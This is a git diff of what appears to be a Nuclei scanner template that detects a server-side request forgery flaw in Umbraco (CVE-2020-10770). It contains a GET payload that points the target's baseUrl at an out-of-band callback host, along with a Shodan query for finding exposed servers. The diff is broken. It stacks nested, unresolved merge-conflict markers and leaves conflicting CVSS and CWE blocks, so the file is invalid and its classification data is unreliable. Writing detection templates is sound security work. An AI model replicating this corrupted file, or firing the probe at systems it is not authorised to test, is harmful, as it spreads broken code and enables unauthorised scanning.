@@ -9,12 +9,15 @@ info:
     - https://www.exploit-db.com/exploits/50462
   classification:
 <<<<<<< HEAD
+<<<<<<< HEAD
     cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:L/A:N
     cvss-score: 5.3
     cve-id: CVE-2020-10770
     cwe-id: CWE-601
   tags: ssrf,umbraco,oast
 =======
+=======
+>>>>>>> 18ddf72b (add new stuff)
     cvss-metrics: CVSS:3.0/AV:N/AC:H/PR:N/UI:N/S:C/C:H/I:N/A:N
     cvss-score: 6.8
     cwe-id: CWE-918
@@ -22,7 +25,10 @@ info:
     verified: true
     shodan-query: http.html:"Umbraco"
   tags: oast,edb,ssrf,umbraco
+<<<<<<< HEAD
 >>>>>>> 5d36d276 (add new stuff)
+=======
+>>>>>>> 18ddf72b (add new stuff)
 
 requests:
   - method: GET
@@ -32,13 +38,18 @@ requests:
       - '{{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/'
 
     stop-at-first-match: true
+    req-condition: true
+    matchers-condition: and
     matchers:
       - type: word
         part: interactsh_protocol # Confirms the HTTP Interaction
         words:
           - "http"
 <<<<<<< HEAD
+<<<<<<< HEAD
 =======
+=======
+>>>>>>> 18ddf72b (add new stuff)
 
       - type: dsl
         dsl:
@@ -47,4 +58,7 @@ requests:
           - "len(body_3)==0"
 
 # Enhanced by cs 08/03/2022
+<<<<<<< HEAD
 >>>>>>> 5d36d276 (add new stuff)
+=======
+>>>>>>> 18ddf72b (add new stuff)
